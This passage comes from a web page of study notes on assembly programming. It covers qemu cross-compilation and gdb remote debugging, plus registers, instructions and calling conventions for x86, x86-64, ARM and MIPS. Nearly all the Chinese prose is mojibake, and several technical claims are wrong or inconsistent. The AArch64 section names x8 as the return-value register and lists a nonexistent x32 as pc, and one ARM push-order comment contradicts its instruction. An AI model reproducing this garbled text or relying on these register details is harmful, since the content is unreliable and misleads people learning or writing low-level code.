-gdb tcp:1234</code> gdbserverç­‰å¾…è¿æ¥ï¼Œé»˜è®¤ç«¯å£ <code>1234</code></p></li><li><p>ç¼–ç¨‹æµ‹è¯•</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello, world!&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¯»æ‰¾åŠ¨æ€é“¾æ¥åº“ã€‚<code>lib-&gt;/usr/lib</code> çš„é“¾æ¥</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /usr/lib | grep arm  <span class="comment"># aarch64 mips...</span></span><br></pre></td></tr></table></figure><ul><li>arm æµ‹è¯•ï¼Œä¸çŸ¥ä¸ºä»€ä¹ˆï¼Œæµ‹è¯•æ—¶ <code>-g</code>æ”¾å‰é¢æ‰æˆåŠŸ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç¼–è¯‘</span></span><br><span class="line">arm-linux-gnueabi-gcc hello.c -o helloarm -g</span><br><span class="line">aarch64-linux-gnu-gcc hello.c -o helloaarch -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œ</span></span><br><span class="line">$ qemu-arm -L /usr/arm-linux-gnueabi ./helloarm</span><br><span class="line">$ qemu-aarch64</span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒè¯•</span></span><br><span class="line">$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./helloarm </span><br><span class="line">$ gdb-multiarch</span><br><span class="line">gdb&gt; <span class="built_in">set</span> <span class="built_in">arch</span> arm <span class="comment"># aarch64</span></span><br><span class="line">gdb&gt; target remote localhost:1234</span><br><span class="line">xxx </span><br></pre></td></tr></table></figure><ul><li>mips æµ‹è¯•, ä¸armç±»ä¼¼</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mips-linux-gnu-gcc hello.c -o hellomips -g</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><ul><li>CISC</li></ul><h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3><ul><li>intel x86 é€šç”¨å¯„å­˜å™¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; é€šç”¨</span><br><span class="line">eax: ç´¯åŠ å™¨</span><br><span class="line">ebx: ä¸€èˆ¬åŸºå€å¯„å­˜å™¨ï¼Œbase</span><br><span class="line">ecx: counter, åœ¨loopæ—¶ï¼Œé»˜è®¤è®¡æ•°</span><br><span class="line">edx: ä¸€èˆ¬ç”¨äºå­˜æ”¾data</span><br><span class="line"></span><br><span class="line">esi: source index, å¤„ç†å­—ç¬¦ä¸²å¸¸ç”¨</span><br><span class="line">edi: destinatin index, å¤„ç†å­—ç¬¦ä¸²å¸¸ç”¨</span><br><span class="line"></span><br><span class="line">esp: stack pointer, æ ˆé¡¶</span><br><span class="line">ebp: base pointer, æ ˆåŸºå€</span><br><span class="line"></span><br><span class="line">eip: æŒ‡å‘å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</span><br></pre></td></tr></table></figure><ul><li>æ ‡å¿—ä½ <code>eflags</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CF: carry flag, è¿›ä½</span><br><span class="line">ZF: zero, 0</span><br><span class="line">SF: sign, ç¬¦å·</span><br><span class="line">OF: overflow, æº¢å‡º</span><br><span class="line">TF: trap, è·Ÿè¸ª</span><br><span class="line">IF: interrupt, ä¸­æ–­</span><br><span class="line">PF: parity, å¥‡å¶</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>æ®µå¯„å­˜å™¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cs: code segment ä»£ç æ®µ</span><br><span class="line">ds: data æ•°æ®æ®µ</span><br><span class="line">ss: stack å †æ ˆæ®µ</span><br><span class="line">es: extend æ‰©å±•æ®µ</span><br><span class="line">fs: æ•°æ®æ®µ</span><br><span class="line">gs: æ•°æ®æ®µ</span><br></pre></td></tr></table></figure><ul><li>æ§åˆ¶å¯„å­˜å™¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; æŸäº›ä¿æŠ¤æ¨¡å¼</span><br><span class="line">cr0-cr4</span><br></pre></td></tr></table></figure><ul><li>å¯»å€</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov</span><br><span class="line">lea</span><br></pre></td></tr></table></figure><ul><li>ç®—æœ¯æŒ‡ä»¤</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">; åŸºæœ¬è¿ç®—</span><br><span class="line">add</span><br><span class="line">sub</span><br><span class="line">mul</span><br><span class="line">div</span><br><span class="line">inc</span><br><span class="line">dec</span><br><span class="line"></span><br><span class="line">; é€»è¾‘è¿ç®—</span><br><span class="line">cmp</span><br><span class="line">and</span><br><span class="line">or</span><br><span class="line">xor</span><br><span class="line">not</span><br><span class="line"></span><br><span class="line">; ç§»ä½æ“ä½œ</span><br><span class="line">shl  ; shift left</span><br><span class="line">shr</span><br><span class="line">sal  ; shift arithmetic left ç®—æ•°å·¦ç§»</span><br><span class="line">sar</span><br></pre></td></tr></table></figure><ul><li>è·³è½¬</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; jmp ç±»</span><br><span class="line">jmp</span><br><span class="line">jb   ; blow</span><br><span class="line">jg   ; greater</span><br></pre></td></tr></table></figure><ul><li>å‡½æ•°è°ƒç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call function</span><br><span class="line">; call æ‰§è¡Œæ—¶ï¼Œä¿å­˜ eip+4, å¹¶è·³è½¬åˆ°å¯¹åº”åœ°å€</span><br><span class="line">; å‚æ•°ä¼ é€’ï¼Œä½¿ç”¨æ ˆä¼ é€’å‚æ•°</span><br></pre></td></tr></table></figure><ul><li>æ ˆå¸§</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; åœ¨è°ƒç”¨å­ç¨‹åºæ—¶ï¼Œä¼šå¼€è¾Ÿå­ç¨‹åºçš„æ ˆå¸§ã€‚espå’Œebpä¿å­˜æ ˆé¡¶å’Œæ ˆåº•</span><br><span class="line">; åœ¨è¿”å›çˆ¶ç¨‹åºéœ€è¦è¿˜åŸesp, ebpæŒ‡é’ˆã€‚</span><br><span class="line">; æ ˆ ä½åœ°å€ç”Ÿé•¿</span><br><span class="line"></span><br><span class="line">; spè‡ªåŠ¨å˜åŒ–</span><br><span class="line">push ebx  ; sp-4</span><br><span class="line">pop rax   ; sp+4</span><br></pre></td></tr></table></figure><ul><li>ç³»ç»Ÿè°ƒç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; ç³»ç»Ÿä¸­æ–­å¤„ç†syscall</span><br><span class="line">int 0x80            ; eaxç³»ç»Ÿè°ƒç”¨å· ebx, ecx, edxå¯¹åº”å‡½æ•°å‰ä¸‰ä¸ªå‚æ•°</span><br></pre></td></tr></table></figure><h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h3><ul><li><p>å®é™…ä¸Šx86-64ä¸AMD64åŸºæœ¬æ˜¯åŒä¸€ä¸ªISAï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨è´­ä¹°çš„Intelæˆ–è€…AMDç”Ÿäº§çš„CPUï¼Œéƒ½å±äºx86-64çš„ISAã€‚</p></li><li><p>x86-64: 64ä½ï¼Œå¯å¯»å€ <code>2^64</code>, å…¼å®¹x86</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; 32ä½ r-&gt;bæ¯”å¦‚ rax-&gt;eax</span><br><span class="line">rax, rbx, rcx, rdx</span><br><span class="line">rsi, rdi</span><br><span class="line">rsp, rbp</span><br><span class="line">r8: r8d 32ä½ å¯„å­˜å™¨ï¼Œä½32ä½</span><br><span class="line">r9: r9d</span><br><span class="line">r10: ...</span><br><span class="line">r11: ...</span><br><span class="line">r12: ...</span><br><span class="line">r13: ...</span><br><span class="line">r14: ...</span><br><span class="line">r15: ...</span><br></pre></td></tr></table></figure><ul><li>Linuxä¸‹å‡½æ•°è°ƒç”¨çº¦å®š, ä¸x86ç›¸å·®è¾ƒå¤§</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; å‡½æ•°å‚æ•°</span><br><span class="line">rdi, rsi, rdx, rcx, r8, r9           ; ä¼ é€’å‰6ä¸ªå‚æ•°ï¼Œç¬¬7ä¸ªå‚æ•°å¼€å§‹å’Œx86ä¸€æ ·ä½¿ç”¨æ ˆä¼ é€’</span><br><span class="line"></span><br><span class="line">; è¿”å›å€¼</span><br><span class="line">rax</span><br></pre></td></tr></table></figure><ul><li>ç³»ç»Ÿè°ƒç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; syscall</span><br><span class="line">rax: ç³»ç»Ÿè°ƒç”¨å·</span><br><span class="line">; å‚æ•°ä¼ é€’ä¸å‡½æ•°ä¸€è‡´ï¼Œ rdi, rsi...</span><br></pre></td></tr></table></figure><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><ul><li><p>RISC</p></li><li><p>ARMæŒ‡ä»¤æ ¼å¼</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">label op-code oprand1 oprand2 oprand3 ...        @commit</span><br><span class="line"></span><br><span class="line">@ æ›´åŠ å­¦æœ¯ rd: destination; rn: å¯„å­˜å™¨ä¸­ç”¨äºç®—æœ¯è¿ç®—çš„æ“ä½œæ•°; shifter_operand: æ•°æ®å¤„ç†æŒ‡ä»¤</span><br><span class="line">&lt;opcode&gt; &#123;&lt;cond&gt;&#125; &#123;S&#125; &lt;rd&gt;,&lt;rn&gt;,&lt;shifter_operand&gt;</span><br><span class="line"></span><br><span class="line">@ æ³¨é‡Š  `@`, `//`  `/**/` `;`</span><br></pre></td></tr></table></figure><h3 id="ARMv7"><a href="#ARMv7" class="headerlink" title="ARMv7"></a>ARMv7</h3><ul><li><p>32ä½æŒ‡ä»¤é›†<code>A32</code>ï¼Œå…¼å®¹16ä½æŒ‡ä»¤é›†<code>T16</code></p><ul><li>ç”±äºARMv7 å…¼å®¹ <code>ARM</code>å’Œ <code>Thumb</code>æŒ‡ä»¤é›†ï¼ŒåŒºåˆ†ä¸¤ä¸ªæŒ‡ä»¤é›†ï¼š <code>addr &amp; 1 == 1</code>ä»£è¡¨<code>thumb</code>æŒ‡ä»¤é›†</li></ul></li><li><p>ARMv7é€šç”¨å¯„å­˜å™¨</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r0-r3: args, å‡½æ•°å‰å››ä¸ªå‚æ•°ï¼Œè¿”å›å€¼ä¹Ÿä¼šå­˜å…¥r0. </span><br><span class="line">r4-r10:  </span><br><span class="line">r11: fp, frame pointer</span><br><span class="line">r12: ip, Intra-Procedure-call scratch register, åœ¨æ–°ç‰ˆæœ¬å½“ä½œé€šç”¨å¯„å­˜å™¨ä½¿ç”¨ï¼Œä¼šåœ¨blæ—¶å¼•å‘bug</span><br><span class="line">r13: sp, stack pointer</span><br><span class="line">r14: lr, link register</span><br><span class="line">r15: pc, program count, æŒ‡å‘ä¸‹ä¸€æ¡éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤</span><br></pre></td></tr></table></figure><ul><li>æ ‡å¿—ä½(CPSR: program status reg),å¦‚æœæƒ³æ”¹å˜ï¼Œéœ€è¦åœ¨æŸäº›æŒ‡ä»¤ååŠ  <code>s</code> (sub -&gt; subs)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">N: negative, è¿ç®—ç»“æœ&gt;=0 N=0, è´Ÿæ•°ï¼ŒN=1</span><br><span class="line">Z: zero, ä¸º0</span><br><span class="line">C: carry, è¿›ä½</span><br><span class="line">V: overflow æœ‰æº¢å‡º</span><br><span class="line"></span><br><span class="line">; cmp å¯ä»¥æ”¹å˜</span><br><span class="line">cmp r0, r1</span><br></pre></td></tr></table></figure><ul><li>mov ç«‹å³æ•°</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov r0, #1     @ r0 &lt;- 1</span><br><span class="line"></span><br><span class="line">@ ç‰¹æ®Šå¯„å­˜å™¨ cpsr || spsr</span><br><span class="line">mrs r0, cpsr   @ r0 &lt;- cpsr</span><br><span class="line">msr cpsr, r1   @ cpsr &lt;- r1</span><br></pre></td></tr></table></figure><ul><li>è®¿é—®å†…å­˜</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@ ä¸èƒ½ç›´æ¥åƒintel movè®¿é—®å†…å­˜, ä½¿ç”¨ load, storeå‘½ä»¤é—´æ¥è®¿é—®å†…å­˜</span><br><span class="line">ldr rd, [rn , #offset]   @ load register</span><br><span class="line">str rd, [rn, #offset]</span><br><span class="line">ldm                      @ load multiple</span><br><span class="line">stm  </span><br><span class="line"></span><br><span class="line">; ä¾‹å­</span><br><span class="line">ldr r0, =0X20000002  @ r0=0X20000002ï¼ŒåŠ è½½åœ°å€åˆ°å¯„å­˜å™¨ </span><br><span class="line">str r1, [r0]         @ r1 ä¸­çš„å€¼å†™å…¥åˆ° r0 ä¸­æ‰€ä¿å­˜çš„åœ°å€ä¸­</span><br></pre></td></tr></table></figure><ul><li>ç®—æœ¯æŒ‡ä»¤</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@ åŸºæœ¬ç®—æ•°è¿ç®—</span><br><span class="line">add rd, rn, rm   @ rd = rn + rm</span><br><span class="line">sub rd, rn, rm   @ rd = rn - rm</span><br><span class="line">mul rd, rn, rm   @ rd = rn * rm</span><br><span class="line">sdiv rd, rn, rm  @ rd = rn / rm, s(ign)div u(nsign)div</span><br><span class="line"></span><br><span class="line">@ æƒ³æ”¹å˜æ ‡å¿—ä½, åŠ  &#x27;s&#x27; =&gt; subs...</span><br><span class="line"></span><br><span class="line">@ é€»è¾‘è¿ç®—</span><br><span class="line">and rd, rn       @ rd = rd &amp; rn</span><br><span class="line">and rd, rn, #imm @ rd = rn &amp; #imm</span><br><span class="line">orr rd, rn       @ rd = rd | rn</span><br><span class="line">eor rd, rn       @ rd = rd ^ rn</span><br><span class="line"></span><br><span class="line">@ ç§»ä½æ“ä½œ</span><br><span class="line">lsl   @ logic shift left é€»è¾‘å·¦ç§»</span><br><span class="line">lsr   @ é€»è¾‘å³ç§»</span><br><span class="line">asr   @ arithmetic shift right ç®—æ•°å³ç§»</span><br><span class="line">ror   @ rotate right å¾ªç¯å³ç§»</span><br></pre></td></tr></table></figure><ul><li>ç¨‹åºè·³è½¬</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">b: ç›´æ¥è·³åˆ°labelã€‚ branch</span><br><span class="line">bx: è·³è½¬+çŠ¶æ€åˆ‡æ¢    @ ARM/Thumb æ¨¡å¼(ä½¿ç”¨ä¸€æ¬¡ï¼Œåˆ‡æ¢ä¸€æ¬¡)</span><br><span class="line">bl: b + link, é¦–å…ˆä¿å­˜ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€åˆ°lr, ç„¶åæ”¹å˜pcã€‚</span><br><span class="line">blx: bl+bx</span><br><span class="line"></span><br><span class="line">@ æ¡ä»¶è·³è½¬, çŠ¶æ€å¯„å­˜å™¨</span><br><span class="line">eq: equal ç›¸ç­‰</span><br><span class="line">ne: not eq</span><br><span class="line">lt: less </span><br><span class="line">le: less equal</span><br></pre></td></tr></table></figure><ul><li>å‡½æ•°è°ƒç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ ä»ç„¶æ˜¯ä½¿ç”¨ `b` æŒ‡ä»¤è°ƒç”¨å‡½æ•°</span><br></pre></td></tr></table></figure><ul><li>æ ˆå¸§ç›¸å…³</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@ sp, fp ç»´æŠ¤æ ˆå¸§çš„çŠ¶æ€, æ ˆå‘ ä½åœ°å€ç”Ÿé•¿</span><br><span class="line"></span><br><span class="line">fp -&gt; +-------+</span><br><span class="line">      | frame |</span><br><span class="line">sp -&gt; +-------+</span><br><span class="line"></span><br><span class="line">@ push/pop å¯ä»¥æ“ä½œå¤šä¸ªå¯„å­˜å™¨ï¼Œç”šè‡³å¯ä»¥æ§åˆ¶pc; spè‡ªåŠ¨å˜åŒ–</span><br><span class="line">@ ä¸‹é¢æ˜¯å¸¸è§çš„å‡½æ•°è°ƒç”¨å‡ºç°å‡ºç°çš„gadget </span><br><span class="line">push &#123;r0-r4, lr&#125;           @ é¡ºåºæ˜¯ push r12; push r4; push r3 ...</span><br><span class="line">...</span><br><span class="line">pop &#123;r0-r4, pc&#125;            @ é¡ºåºæ˜¯  pop r0; pop r1; ...</span><br><span class="line"></span><br><span class="line">@ ç­‰ä»·äº push, å…ˆè®¡ç®—spçš„å€¼?</span><br><span class="line">stmfd sp!, &#123;r0-r4, r12&#125;</span><br><span class="line"></span><br><span class="line">@ ç­‰ä»·äº pop</span><br><span class="line">ldmfd sp!, lr</span><br></pre></td></tr></table></figure><ul><li>ç³»ç»Ÿä¸­æ–­</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@ é€šè¿‡vector_swi/svc è·å¾—ç³»ç»Ÿè°ƒç”¨å·</span><br><span class="line">swi #imm</span><br><span class="line">svc #imm</span><br><span class="line"></span><br><span class="line">@ O(old)ABI å½¢å¼</span><br><span class="line">mov r0, #34</span><br><span class="line">swi 12</span><br><span class="line"></span><br><span class="line">@ E(extended)ABI å½¢å¼ï¼Œç«‹å³æ•° immè¢«å¿½ç•¥,ç”±r0å†³å®š</span><br><span class="line">mov r0, #12</span><br><span class="line">mov r1, #34</span><br><span class="line">swi 0</span><br></pre></td></tr></table></figure><h3 id="ARMv8"><a href="#ARMv8" class="headerlink" title="ARMv8"></a>ARMv8</h3><ul><li><p>ä¸ <code>armv7</code> å­˜åœ¨ä¸€å®šçš„åŒºåˆ«</p></li><li><p>64ä½æŒ‡ä»¤é›† <code>aarch64</code>, å…¼å®¹32ä½ <code>aarch32</code></p></li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aarch64: 64-bit registers and memory accesses, new instruction setï¼›</span><br><span class="line">aarch32: backwards compatible with ARMv7-A</span><br></pre></td></tr></table></figure><ul><li>ARMv8 é€šç”¨å¯„å­˜å™¨</li></ul><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">x0</span>-x31</span><br><span class="line"><span class="symbol">x0</span>-x7: å‡½æ•°å‰<span class="number">8</span>ä¸ªå‚æ•°å€¼</span><br><span class="line"><span class="symbol">x8:</span> å‡½æ•°è¿”å›å€¼</span><br><span class="line"><span class="symbol">x19</span>-x28: æ²¡ç‰¹æ®Šç”¨é€” </span><br><span class="line"><span class="symbol">x29:</span> <span class="built_in">fp</span> frame pointer</span><br><span class="line"><span class="symbol">x30:</span> <span class="built_in">lr</span></span><br><span class="line"><span class="symbol">x31:</span> zr, zero register, æ’<span class="number">0</span></span><br><span class="line"><span class="symbol">x32:</span> <span class="built_in">pc</span>, ä¸èƒ½åƒarmv7ä¸€æ ·è¢«ä¿®æ”¹</span><br><span class="line"></span><br><span class="line"><span class="comment">@ ä¹Ÿå¯ä½¿ç”¨32ä½çš„ w0...å¯„å­˜å™¨, å¯æ‰©å±•ä½¿ç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">@ spå¯¹åº”çš„ç‰©ç†å¯„å­˜å™¨æœ‰å¦‚ä¸‹å››ä¸ª(æŸä¸€æ—¶åˆ»åªèƒ½å¯¹åº”ä¸‹é¢å…¶ä¸­ä¸€ä¸ª)</span></span><br><span class="line"><span class="symbol">SP_EL0</span>å’ŒSP_EL1</span><br><span class="line"><span class="symbol">SP_EL2</span></span><br><span class="line"><span class="symbol">SP_EL3</span></span><br></pre></td></tr></table></figure><ul><li><p>SPSR æ›¿ä»£äº† CPSR</p></li><li><p>å†…å­˜è®¿é—®</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@ load &amp; store, å…¼å®¹armv7 ldr</span><br><span class="line">ldp  @ load pair ä¸€å¯¹ã€‚</span><br><span class="line">ldp x8, x2, [x0, #0x10]   @ å°†x8&lt;-(x0+0x10), x2&lt;-(x0+0x10+8)</span><br><span class="line">stp  @ store pair</span><br></pre></td></tr></table></figure><ul><li>å‡½æ•°</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@ å‚æ•°ä¼ é€’</span><br><span class="line">x0-x7: å‡½æ•°å‰8ä¸ªå‚æ•°å€¼</span><br><span class="line">x8: å‡½æ•°è¿”å›å€¼</span><br><span class="line"></span><br><span class="line">@ aarch64æ²¡æœ‰pushå’Œpop æŒ‡ä»¤</span><br></pre></td></tr></table></figure><ul><li>ç³»ç»Ÿè°ƒç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ supervisor call</span><br><span class="line">svc #imm</span><br></pre></td></tr></table></figure><ul><li>TrustZone ç›¸å…³<br>xxx</li></ul><h3 id="ARMv9"><a href="#ARMv9" class="headerlink" title="ARMv9"></a>ARMv9</h3><p>xxx</p><h2 id="Mips"><a href="#Mips" class="headerlink" title="Mips"></a>Mips</h2><ul><li><p>RISCï¼Œ <code>Microprocessor without Interlocked Pipeline Stages</code></p></li><li><p><code>mips</code> æ˜¯<code>big-endian</code>, mipselæ˜¯ <code>little-endian</code></p></li><li><p>æ ¼å¼</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># æ ¹æ®ä½æ•°</span><br><span class="line">31-26   25-21 20-16 15-11  10-6  5-0</span><br><span class="line">op-code   rs    rt   rd    shamt func</span><br><span class="line"></span><br><span class="line"># æ³¨é‡Šä½¿ç”¨ `#`</span><br><span class="line"></span><br><span class="line">rd: register destination</span><br><span class="line">rt: target</span><br><span class="line">rs: source</span><br></pre></td></tr></table></figure><ul><li>é€šç”¨å¯„å­˜å™¨ï¼Œ 32ä¸ª</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">0</span>-$<span class="number">31</span>          <span class="comment"># æœ‰å„è‡ªçš„åŠ©è®°ç¬¦ï¼Œçœ‹æ±‡ç¼–æ—¶å¤šä½¿ç”¨åŠ©è®°ç¬¦</span></span><br><span class="line"><span class="symbol">$0:</span>    $<span class="built_in">zero</span>    <span class="comment"># æ’0</span></span><br><span class="line"><span class="number">1</span>:     $<span class="built_in">at</span>      # </span><br><span 